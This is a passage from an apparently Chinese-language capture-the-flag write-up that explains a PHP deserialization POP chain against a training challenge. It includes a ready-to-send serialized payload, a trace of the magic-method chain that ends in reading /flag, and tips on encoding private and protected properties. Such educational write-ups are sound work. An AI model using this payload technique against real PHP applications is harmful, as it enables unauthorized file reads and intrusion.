-</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>  s:4:"name";O:3:"Sec":2:{
-</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
-</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>    s:3:"var";O:4:"eeee":1:{
-</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>      s:3:"obj";O:5:"Start":2:{
-</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>        s:4:"name";N;
-</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
-</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>      }
-</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a>    }
-</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a>  }
-</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a>  s:4:"func";N;
-</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>}
-</span></code></pre></div>
-<p><strong>压成一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
-</span></code></pre></div>
-<p><strong>POST 参数名 <code>pop</code>，值就是上面那串。</strong></p>
-<h4 id="payload_1"><a class="toclink" href="../../newstarctf-unserializeone/#payload_1">这个 payload 的结构对照</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>外层 Start
-</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
-</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
-</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
-</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
-</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
-</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
-</span></code></pre></div>
-<hr />
-<h3 id="_4"><a class="toclink" href="../../newstarctf-unserializeone/#_4">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>从能读 flag 的地方倒推：
-</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>  file_get_contents  → Sec::__invoke
-</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
-</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
-</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
-</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
-</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
-</span></code></pre></div>
-<p><strong>每一步都在问同一个问题：</strong>要走到下一步，得先满足什么条件？<strong>——然后去别的类里找满足这个条件的地方。</strong></p>
-<h4 id="_5"><a class="toclink" href="../../newstarctf-unserializeone/#_5">漏洞原理</a></h4>
-<p><strong>① 魔术方法 = 自动触发的“钩子”</strong></p>
-<p><strong>PHP 在很多操作上埋了钩子：对象销毁、被当字符串、被当函数、访问不存在的属性、调用不存在的方法、被 clone……开发者通常不知道这些钩子会在什么时候被调用。</strong></p>
-<p><strong>② 只要链上每一环的属性都可控，就能拼出一条执行路径</strong></p>
-<p><strong><code>unserialize</code> 允许攻击者指定属性的</strong>类型和内容<strong>——一个字符串可以变成对象、对象可以变成另一个类的对象。于是本来毫无关系的四个类，被拼成了一条完整的调用链。</strong></p>
-<p><strong>这就是 POP 链（Property-Oriented Programming）：</strong>不执行代码，只摆对象，让程序自己走过去。**</p>
-<p><strong>③ 最终的 sink 是 <code>file_get_contents('/flag')</code></strong></p>
-<p><strong>链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。</strong></p>
-<h4 id="_6"><a class="toclink" href="../../newstarctf-unserializeone/#_6">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>魔术方法</th>
-<th>触发条件</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>__destruct()</code></td>
-<td>对象被销毁（脚本结束时自动调用）</td>
-</tr>
-<tr>
-<td><code>__toString()</code></td>
-<td>对象被当成字符串使用（拼接、echo、比较）</td>
-</tr>
-<tr>
-<td><code>__call($name,$args)</code></td>
-<td>调用了<strong>不存在</strong>的方法</td>
-</tr>
-<tr>
-<td><code>__clone()</code></td>
-<td>对象被 <code>clone</code> 时</td>
-</tr>
-<tr>
-<td><code>__isset($name)</code></td>
-<td>对<strong>不存在/不可访问</strong>的属性调用 <code>isset()</code> 或 <code>empty()</code></td>
-</tr>
-<tr>
-<td><code>__invoke()</code></td>
-<td>对象被当成函数调用，如 <code>$obj()</code></td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>属性可见性：protected / private 的写法不一样</summary>
-<p><strong>本题源码里四个类的属性在页面截图上都是 <code>public</code>，所以直接写属性名就行。</strong></p>
-<p><strong>但如果遇到 <code>protected</code> 或 <code>private</code>，序列化串里的名字要带前缀，而且</strong>长度要把前缀算进去<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>public     s:4:"name";          直接写名字
-</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
-</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
-</span></code></pre></div>
-<p><strong>本地构造时要按目标类的真实可见性来写</strong>，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。</p>
-</details>
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① 起点不要从某个类硬找</strong></p>
-<p>这题的起点是 <code>__destruct</code>——它不需要任何操作就会触发，所以<strong>从“谁最先被自动调用”往回推，比从入口 <code>unserialize</code> 正着推更快</strong>。</p>
-<p><strong>② 把它当成“倒推题”而不是“写代码题”</strong></p>
-<p>链子上每一环的答案都藏在别的类里，<strong>不需要写新代码，只需要摆对象</strong>。</p>
-<p><strong>③ 本地搭一份再改</strong></p>
-<p>把四个类复制到本地 PHP 里，用 <code>serialize()</code> 生成基础串，再对着改属性——比自己手数括号可靠得多。</p>
 </details>
     
     
